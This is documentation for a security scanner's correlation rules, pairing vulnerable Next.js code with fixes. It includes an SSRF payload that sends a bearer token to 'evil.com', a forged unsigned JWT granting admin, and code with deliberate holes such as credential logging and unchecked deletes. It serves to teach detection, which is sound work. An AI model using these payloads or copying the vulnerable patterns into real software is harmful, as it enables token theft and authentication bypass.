# Correlation Rules Guide

VibeCheck's Phase 4 correlation engine detects security patterns that span multiple scanner findings. These rules identify risks that only become visible when analyzing relationships between different types of issues.

## How Correlation Works

1. **Phase 1-3 scanners** run independently, each producing findings
2. **Phase 4 correlator** runs after all scanners complete
3. **Correlation rules** analyze combinations of findings, routes, and proof traces
4. **New findings** are generated when dangerous patterns are detected

Correlation runs deterministically - same input always produces the same correlation findings.

---

## VC-CORR-001: Auth Without Validation

**Pattern**: `auth_without_validation`
**Severity**: Medium
**Confidence**: 75%

### What It Detects

A state-changing endpoint (POST/PUT/PATCH/DELETE) has authentication checks but no input validation. Authenticated users can submit malicious or malformed data.

### Triggers When

- Route is state-changing (POST, PUT, PATCH, DELETE)
- Route has auth-category findings (authentication is present)
- Route has zero validation-category findings

### Example: Vulnerable Code

```typescript
// app/api/users/route.ts
import { getServerSession } from "next-auth";

export async function POST(request: Request) {
  const session = await getServerSession(); // ✓ Auth check
  if (!session) {
    return Response.json({ error: "Unauthorized" }, { status: 401 });
  }

  const body = await request.json(); // ✗ No validation!

  // Directly using unvalidated input
  await db.user.create({
    data: {
      name: body.name,        // Could be anything
      email: body.email,      // Could be malformed
      role: body.role,        // Could escalate privileges!
    },
  });

  return Response.json({ success: true });
}
```

### Fix

```typescript
import { getServerSession } from "next-auth";
import { z } from "zod";

const CreateUserSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
  // Don't allow role from user input!
});

export async function POST(request: Request) {
  const session = await getServerSession();
  if (!session) {
    return Response.json({ error: "Unauthorized" }, { status: 401 });
  }

  const body = await request.json();
  const validated = CreateUserSchema.safeParse(body);

  if (!validated.success) {
    return Response.json({ error: validated.error }, { status: 400 });
  }

  await db.user.create({
    data: {
      name: validated.data.name,
      email: validated.data.email,
      role: "user", // Server sets role
    },
  });

  return Response.json({ success: true });
}
```

### Why This Matters

Authentication answers "who are you?" but not "is your input valid?" An authenticated attacker can:
- Submit malformed data causing crashes
- Inject malicious values (SQL injection, XSS)
- Escalate privileges by setting admin flags
- Cause data corruption with invalid types

---

## VC-CORR-002: Middleware Upload Gap

**Pattern**: `middleware_upload_gap`
**Severity**: High
**Confidence**: 80%

### What It Detects

A file upload endpoint exists but is not covered by the global middleware matcher. Upload endpoints without rate limiting are vulnerable to denial-of-service attacks.

### Triggers When

- Middleware coverage analysis shows route is uncovered
- Route has upload-related findings (VC-UP-*)

### Example: Vulnerable Configuration

```typescript
// middleware.ts
export const config = {
  matcher: [
    // Excludes /api/upload from middleware!
    "/((?!api/upload|_next/static|favicon.ico).*)",
  ],
};

export function middleware(request: NextRequest) {
  // Rate limiting, auth checks...
  return rateLimit(request);
}
```

```typescript
// app/api/upload/route.ts
export async function POST(request: Request) {
  // No rate limit protection!
  const formData = await request.formData();
  const file = formData.get("file") as File;

  // Attackers can spam uploads
  await saveFile(file);

  return Response.json({ success: true });
}
```

### Fix

```typescript
// middleware.ts
export const config = {
  matcher: [
    // Include upload endpoints in middleware coverage
    "/((?!_next/static|favicon.ico).*)",
  ],
};
```

Or add explicit rate limiting to the handler:

```typescript
// app/api/upload/route.ts
import { rateLimit } from "@/lib/rate-limit";

export async function POST(request: Request) {
  const limited = await rateLimit(request, { max: 10, window: 60 });
  if (limited) {
    return Response.json({ error: "Rate limited" }, { status: 429 });
  }

  const formData = await request.formData();
  // ...
}
```

---

## VC-CORR-003: Network Auth Leak

**Pattern**: `network_auth_leak`
**Severity**: Critical
**Confidence**: 70%

### What It Detects

A file contains both SSRF-prone fetch calls AND authentication/token handling. Tokens may be inadvertently forwarded to attacker-controlled servers.

### Triggers When

- File has network findings (VC-NET-001 SSRF)
- File has auth-related findings or token handling

### Example: Vulnerable Code

```typescript
// app/api/proxy/route.ts
import { getServerSession } from "next-auth";

export async function POST(request: Request) {
  const session = await getServerSession();
  if (!session) {
    return Response.json({ error: "Unauthorized" }, { status: 401 });
  }

  const { url } = await request.json();

  // DANGEROUS: Forwarding auth header to user-controlled URL!
  const response = await fetch(url, {
    headers: {
      Authorization: `Bearer ${session.accessToken}`,
    },
  });

  return Response.json(await response.json());
}
```

An attacker sends:
```json
{ "url": "https://evil.com/steal-token" }
```

The server forwards the `Authorization` header to `evil.com`, leaking the token.

### Fix

```typescript
const ALLOWED_HOSTS = ["api.trusted.com", "internal.service.local"];

export async function POST(request: Request) {
  const session = await getServerSession();
  if (!session) {
    return Response.json({ error: "Unauthorized" }, { status: 401 });
  }

  const { url } = await request.json();

  // Validate URL against allowlist
  const parsed = new URL(url);
  if (!ALLOWED_HOSTS.includes(parsed.host)) {
    return Response.json({ error: "URL not allowed" }, { status: 400 });
  }

  // Safe: Only forwarding to trusted hosts
  const response = await fetch(url, {
    headers: {
      Authorization: `Bearer ${session.accessToken}`,
    },
  });

  return Response.json(await response.json());
}
```

---

## VC-CORR-004: Privacy in Auth Context

**Pattern**: `privacy_auth_context`
**Severity**: High
**Confidence**: 80%

### What It Detects

Sensitive data logging occurs in an API route context. API routes handle authenticated user data, so logging in this context has higher privacy impact.

### Triggers When

- File has privacy findings (VC-PRIV-*)
- File is an API route (in `/api/`, named `route.ts`, etc.)

### Example: Vulnerable Code

```typescript
// app/api/login/route.ts
export async function POST(request: Request) {
  const { email, password } = await request.json();

  // DANGEROUS: Logging credentials!
  console.log("Login attempt:", { email, password });

  const user = await authenticate(email, password);

  if (!user) {
    console.log("Failed login:", { email, password }); // Logs password!
    return Response.json({ error: "Invalid credentials" }, { status: 401 });
  }

  console.log("Successful login:", JSON.stringify(user)); // Logs PII!

  return Response.json({ token: createToken(user) });
}
```

### Fix

```typescript
// app/api/login/route.ts
export async function POST(request: Request) {
  const { email, password } = await request.json();

  // Log only non-sensitive identifiers
  console.log("Login attempt:", { email, timestamp: Date.now() });

  const user = await authenticate(email, password);

  if (!user) {
    console.log("Failed login:", { email });
    return Response.json({ error: "Invalid credentials" }, { status: 401 });
  }

  // Log only user ID, not full user object
  console.log("Successful login:", { userId: user.id });

  return Response.json({ token: createToken(user) });
}
```

---

## VC-CORR-005: JWT Decode on Auth Gate

**Pattern**: `crypto_auth_gate`
**Severity**: Critical
**Confidence**: 85%

### What It Detects

`jwt.decode()` without signature verification is used in an authentication/authorization context. This allows complete auth bypass via token forgery.

### Triggers When

- File has VC-CRYPTO-002 finding (JWT decode without verify)
- File is an API route, middleware, or auth-related file

### Example: Vulnerable Code

```typescript
// middleware.ts
import jwt from "jsonwebtoken";

export function middleware(request: NextRequest) {
  const token = request.cookies.get("token")?.value;

  // CRITICAL: decode() does NOT verify signature!
  const payload = jwt.decode(token);

  if (!payload || !payload.userId) {
    return NextResponse.redirect("/login");
  }

  // Attacker can forge any token!
  return NextResponse.next();
}
```

An attacker creates a forged token:
```javascript
// No secret needed - decode() ignores signature
const forgedToken = btoa(JSON.stringify({ alg: "none" })) + "." +
  btoa(JSON.stringify({ userId: "admin", role: "superuser" })) + ".";
```

### Fix

```typescript
// middleware.ts
import jwt from "jsonwebtoken";

export function middleware(request: NextRequest) {
  const token = request.cookies.get("token")?.value;

  try {
    // verify() checks the signature!
    const payload = jwt.verify(token, process.env.JWT_SECRET!);

    if (!payload || !payload.userId) {
      return NextResponse.redirect("/login");
    }

    return NextResponse.next();
  } catch (error) {
    // Invalid or forged token
    return NextResponse.redirect("/login");
  }
}
```

---

## VC-CORR-006: Hallucination Coverage Gap

**Pattern**: `hallucination_coverage_gap`
**Severity**: High
**Confidence**: 80%

### What It Detects

Comments or imports claim security protection, but the proof trace shows no actual protection. This creates dangerous false confidence.

### Triggers When

- File has hallucination findings (VC-HALL-*)
- Route's proof trace shows "No protection proven"

### Example: Vulnerable Code

```typescript
// app/api/admin/users/route.ts
import { withAuth } from "@/lib/auth"; // Imported but not used!

// This endpoint requires admin authentication
// Security: Protected by withAuth middleware
export async function DELETE(request: Request) {
  const { userId } = await request.json();

  // DANGEROUS: No actual auth check!
  await db.user.delete({ where: { id: userId } });

  return Response.json({ deleted: true });
}
```

The comment claims protection. The import suggests auth. But neither is actually applied.

### Fix

```typescript
// app/api/admin/users/route.ts
import { withAuth, requireRole } from "@/lib/auth";

// Actually wrap the handler with auth
export const DELETE = withAuth(
  requireRole("admin"),
  async (request: Request, { user }) => {
    const { userId } = await request.json();

    // Now actually protected!
    await db.user.delete({ where: { id: userId } });

    return Response.json({ deleted: true });
  }
);
```

---

## Correlation Output

Correlation findings include additional metadata:

```json
{
  "ruleId": "VC-CORR-001",
  "title": "Auth Check Without Input Validation",
  "severity": "medium",
  "confidence": 0.75,
  "category": "correlation",
  "correlationData": {
    "relatedFindingIds": ["abc123...", "def456..."],
    "pattern": "auth_without_validation",
    "explanation": "Route POST /api/users has auth checks but no validation evidence."
  },
  "relatedFindings": ["abc123...", "def456..."]
}
```

The `relatedFindingIds` field links to the original scanner findings that triggered the correlation.

---

## Graph Visualization

Correlation findings can be visualized in the web viewer's graph mode. Nodes represent:

- **Routes**: API endpoints discovered during scanning
- **Findings**: Individual scanner findings
- **Edges**: Correlation relationships between findings

This helps identify clusters of related issues and understand the full attack surface.

See [VIEWER_GUIDE.md](./VIEWER_GUIDE.md) for visualization details.
